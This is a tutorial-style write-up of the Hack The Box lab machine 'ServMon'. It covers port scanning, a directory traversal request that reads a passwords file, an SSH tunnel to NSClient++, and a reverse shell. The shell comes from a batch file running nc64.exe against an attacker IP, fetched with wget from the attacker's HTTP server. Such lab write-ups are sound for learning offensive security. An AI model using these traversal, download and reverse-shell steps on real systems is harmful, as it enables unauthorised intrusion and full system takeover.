## ***Warning: This tutorial is for educational purposes only. Do not try any techniques discussed here on systems you do not own or without explicit permission from the owner.***

Hello!  I am going to go over how I solved the HTB challenge "ServMon". This challenge mainly goes over red-team fundamentals like port scanning, burpsuite payloads, directory traversal, getting a reverse shell, searching through config files, and windows privilege escalation. 

Let's get started:
### Connecting to the Lab:
You can use HTB's VPN connection or with their Pwnbox. I am going to connect over OpenVPN using a local VM I spun up of ParrotOS. 

If you connect via OpenVPN, you can use the following command once you receive the .ovpn file from HTB:

```bash
sudo openvpn lab_willanalyze.ovpn
```

This will initiate a giant wall of text that details your connection. As long as you see the words "Initialization Sequence Completed" in that wall, you should be good to go!
### Reconnaissance and Data Gathering:

#### nmap:

For those who don't know, nmap is a port scanning tool used for a variety of purposes. This includes, but is not limited to, system reconnaissance, security auditing, and troubleshooting

nmap is extremely versatile and I highly recommend you go through the documentation to learn about everything nmap can do: https://nmap.org/docs.html

That said, I am going to keep it simple with my command. This is the nmap command I almost always start with on easy HTB boxes as it usually gets me most of the info I need. 

```bash
nmap -sC -sV [INSERT_IP_HERE]
#olâ€™ reliable
```

To recap what this command means:
**-sV** tells nmap to find, if possible, the version of software. This is extremely important from an attacker's perspective as this could potentially find out-of-date software that can be exploited.
**-sC** tells nmap to run a list of default scripts against the host to check things like supported ciphers, http headers, ssh-hostkeys, etc.

Here is what I got:

``` console
nmap -sC -sV 10.129.184.123

Ok looks like we have a windows box this time around with multiple ports open

To me, there are three interesting ports: ftp on 21, http on 80, and https on 8443. I'm going to prioritize ftp as it allows for anonymous ftp login, allowing us an in.

![](/assets/img/htb_servmon/Screenshot_From_2024-09-27_20-50-00.png)

For anonymous login, really all we have to do is put in "anonymous" as the user name and hit enter when prompted for a password. FTP commands are quite similar to basic unix/unix-like commands with some slight differences. However, I encourage you to get familiar with the FTP command line before we go forward: https://www.cs.colostate.edu/helpdocs/ftp.html

here we find the User folder and two Subfolders: Nathan and Nadine both seem to contain text files, I'm going to transfer those locally using the **get** command:

![](/assets/img/htb_servmon/Screenshot_From_2024-09-27_21-15-14.png)

I'm not seeing much else at the moment, so I am going to log off using the **exit** command. We may want to keep it in mind for future reference though in case we need to upload a reverse shell.

Let's see what's contained in those files:

![](/assets/img/htb_servmon/Screenshot_From_2024-09-27_21-25-55.png)

Looks like there is a passwords.txt file! Looks like our main goal is to find our way to get to C:\\users\\nathan\\desktop\\passwords.txt. In light of this information, I do want to see if I can access the smb share on the host with empty credentials:

![](/assets/img/htb_servmon/Screenshot_From_2024-09-27_22-27-49.png)

no luck there, let's see what we can do on the web pages:

we have two main ones:

on port 80, we have a service named NVMS-1000

![](/assets/img/htb_servmon/Screenshot_From_2024-09-27_21-39-47.png)

on port 8443, we have service called NSClient++ (recommend you open this in a chromium-based browser as it didn't display correctly in firefox)

![](/assets/img/htb_servmon/Screenshot_From_2024-09-27_22-31-22.png)

I tried to input some default user/password combos (i.e. admin/admin, admin/password, user/password, etc.) to see if those worked, but no luck on those. Let's see if there are any CVEs associated with either applications.

Looks like exploit-db has two exploits: one for each app:

NVMS-1000: https://www.exploit-db.com/exploits/48311

NSClient++: https://www.exploit-db.com/exploits/46802

the NVMS-1000 exploit seems to be a directory traversal exploit that allows us to get access to files on the server (might be useful for getting the passwords.txt file)

NSClient++ allows for RCE, albeit authenticated only. This will be useful once we get credentials

### Weaponization round one (user flag)

I am going to start out with the NVMS-1000 exploit. You can use the proof of concept script from exploit-db and modify it to navigate to Nathan's desktop. This time around, I am going to use burpsuite to create the request, mainly for practice.

![](/assets/img/htb_servmon/Screenshot_From_2024-09-27_23-08-29.png)

ok so I have set up the burpsuite proxy and I am going to forward the traffic going to the NVMS-1000 site to get an example request. Then send this to burpsuite repeater.

replace the GET request line with "GET ../../../../../../../../../../../../../users/nathan/desktop/passwords.txt HTTP/1.1" and hit send:

### Delivery/Exploit/Installation round one (user flag)

![](/assets/img/htb_servmon/Screenshot_From_2024-09-27_23-30-48.png)

looks like we have the passwords file! Ior later reference, I recommend that you copy it into a txt file on your machine. Now let's see if we can get an ssh session using either nathan or nadine. 

Since there were only a few possible combinations, I just did manual trial/error to figure this out. However, you can automate this with a tool like crackmapexec. The user/password combo that I landed on was nadine and L1k3B1gBut7s@W0rk (Nadine may need to have a talk with HR), and now we are in! It looks like we are greeted with a windows prompt for nadine at C:\\Users\\Nadine. If you poke around, you can find the user.txt flag at C:\\Users\\Nadine\\Desktop.

**Note: We are going to be using windows cmd and powershell from here on out, so please be sure to get familiar with the commands for both:**

**Windows CMD cheat sheet:** https://www.stationx.net/windows-command-line-cheat-sheet/

**Powershell cheat sheet:** https://www.stationx.net/powershell-cheat-sheet/

Now let's see if we can get root using the NSClient++ exploit:

### Weaponization round two (root flag)

First, I tried logging into nsclient++ using passwords from the password file, but no luck there unfortunately. I did do some googling to see if NSClient++ has some documentation about passwords, and it does seen we can find those in the ini file: https://answerhub.nagios.com/support/s/article/Configuring-NSClient-b82d58d1

``` shell
nadine@SERVMON c:\Program Files\NSClient++>type nsclient.ini | findstr "password"
password = ew2x6SsGTxjRwXOT
```

I then tried to login using this password but I got a not allowed message. 

I dug back through the docs and the ini to see if I was missing something and it looks like I was:

``` shell
; Undocumented key
allowed hosts = 127.0.0.1
```

Looks like it only allows for localhost to do the traffic.

we could edit the file, or we could try and make a tunnel via ssh and do some port forwarding so we can register as the localhost. 

``` shell
ssh nadine@10.129.181.247 -L 8443:127.0.0.1:8443
```

Now let's try logging in at the new address:

``` shell
https://127.0.0.1:8443/index.html#/
```

when we put in the password, looks like we are now in!

Now to execute the exploit, we need to make sure the following is done as per the exploit-db entry: https://www.exploit-db.com/exploits/46802

Exploit:
### 1. Grab web administrator password 
- open c:\\program files\\nsclient++\\nsclient.ini
or
- run the following that is instructed when you select forget password
	C:\\Program Files\\NSClient++>nscp web -- password --display
	Current password: SoSecret

**[COMPLETED]** you can either check the ini using findstr or run that command for the 

### 2. Login and enable following modules including enable at startup and save configuration 
- CheckExternalScripts
- Scheduler

**[COMPLETED]** again. we can see that this is enabled by using findstr on the remote server and look for strings "CheckExternalScripts" o "Scheduler"

### 3. Download nc.exe and evil.bat to c:\\temp from attacking machine
	@echo off
	c:\\temp\\nc64.exe 192.168.0.163 443 -e cmd.exe

**[COMPLETED]** easiest way I saw to do this was to set up a python web server and transfer the files through wget on the target machine:

attacker machine (your machine):

``` bash
python3 -m http.server 8080
```

target machine:

``` powershell
powershell
wget http://10.10.14.4:8080/nc64.exe -o nc64.exe
wget http://10.10.14.4:8080/evil.bat -o evil.bat
```

you can get nc64.exe here: https://github.com/int0x33/nc.exe/blob/master/nc64.exe

**NOTE: make sure you use nc64.exe, nc.exe will get flagged by the OS as malicious and automatically deleted**

### 4. Setup listener on attacking machine

**[COMPLETED]**

``` bash
nc -nlvp 8080 -s [INSERT_LOCAL_VPN_IP_HERE]
```

to break down this input:

**nc**: stands for netcat, a networking tool that allows for us to open up ports and make connections (among other things)
**-lnvp** is just the four following flags combined into one for convenience:
	**-l**: means it is using a listening port
	**-n**: numeric IP only (I haven't given my workstation a hostname so I'm only using IP)
	**-v**: verbose output, helpful for troubleshooting
	**-p**: indicates that we will be specifying the port number. I did 8080, but you can chose any valid port number not currently in use
**8080**: the port number we are using
**-s**: local source address, insert your IP that HTB assigned your machine via VPN. You can either find it through the command line with commands like **ifconfig**, **ip address**, or you can just find it in your machine connection:

![](/assets/img/htb_servmon/Screenshot_From_2024-09-30_02-16-45.png)

### 5. Add script foobar to call evil.bat and save settings
- Settings > External Scripts > Scripts
- Add New
	- foobar
		command = c:\\temp\\evil.bat
		
**[SKIPPED]** just run evil.bat and this should work for our purposes
### 6. Add schedule to call script every 1 minute and save settings
- Settings > Scheduler > Schedules
- Add new
	- foobar
		interval = 1m
		command = foobar

**[SKIPPED]** we don't really need to achieve persistence or anything like that on the machine so you can ignore this. 

### 7. Restart the computer and wait for the reverse shell on attacking machine
	nc -nlvvp 443
	listening on [any] 443 ...
	connect to [192.168.0.163] from (UNKNOWN) [192.168.0.117] 49671
	Microsoft Windows [Version 10.0.17134.753]
	(c) 2018 Microsoft Corporation. All rights reserved.

	C:\\Program Files\\NSClient++>whoami
	whoami
	nt authority\\system
	
**[SKIPPED]** we don't really need to achieve persistence or anything like that on the machine so you can ignore this. 

Run evil.bat and check your netcat instance:

![](/assets/img/htb_servmon/Screenshot_From_2024-10-01_00-20-26.png)

You should be greeted by a prompt, and if you run whoami, you should see this:

![](/assets/img/htb_servmon/Screenshot_From_2024-10-01_00-25-23.png)

Then if you navigate to the desktop for the administrator user, you should see the root.txt file:

![](/assets/img/htb_servmon/Screenshot_From_2024-10-01_00-29-22.png)

From there, you should see the root.txt file containing the root flag

Hope this helped, happy hacking!
